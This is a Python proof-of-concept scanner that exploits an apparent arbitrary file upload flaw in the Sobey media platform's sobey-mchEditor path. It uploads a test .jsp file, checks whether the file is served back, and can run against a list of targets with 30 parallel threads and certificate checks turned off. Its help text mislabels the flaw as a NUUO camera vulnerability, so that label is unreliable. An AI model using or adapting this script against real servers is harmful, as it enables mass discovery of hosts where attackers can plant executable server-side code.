import requests
import argparse
import random
import sys

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def get_random_ascii_art():
    arts = [
        r"""
          /\_/\  
         ( o.o ) 
          > ^ <
        """,
        r"""
           _____
          /     \
         /  O  O \
         \_____/
        """,
        r"""
         /|\\
        ( o o )
         > ^ <
        """,
        r"""
          .-. 
         | | |
         \_/ 
        """,
        r"""
          _____
         /     \
        /       \
        \_______/
        """
    ]
    return random.choice(arts)


def main(domain):
    if ('http' in domain):
        check(domain)
    else:
        check(f"http://{domain}")


def check(domain):
    url = f"{domain}/sobey-mchEditor/aaa.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }
    try:
        response = requests.post(url=url, headers=headers, files={'file': ('.jsp', '123', 'image/jsp')}, verify=False,
                                 timeout=5)
        response1 = requests.get(
            f"{domain}/sobey-mchEditor/aaa.jsp",
            headers={"User-Agent": "Mozilla/5.0"},
            verify=False,
            timeout=10
        )
        if response1.status_code == 200 and '123' in response1.text:
            print(response1.text)
            print(f"目标URL存在漏洞: {domain}")
        else:
            print(f"目标URL不存在漏洞: {domain}，状态码: {response.status_code}")
    except Exception as e:
        print(f"错误地址{domain}")


if __name__ == '__main__':
    # 显示启动字符画（仅此处调用一次）
    print(get_random_ascii_art())
    print("索贝融媒体系统任意文件上传工具\n")

    parse = argparse.ArgumentParser(description="NUUO摄像头文件上传漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入目标URL')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请输入包含目标URL的文件')
    args = parse.parse_args()

    if args.url:
        main(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
                pool = Pool(30)
                pool.map(main, domains)
        except FileNotFoundError:
            print(f"错误: 文件 {args.file} 未找到")
    else:
        print("请提供URL或文件路径")
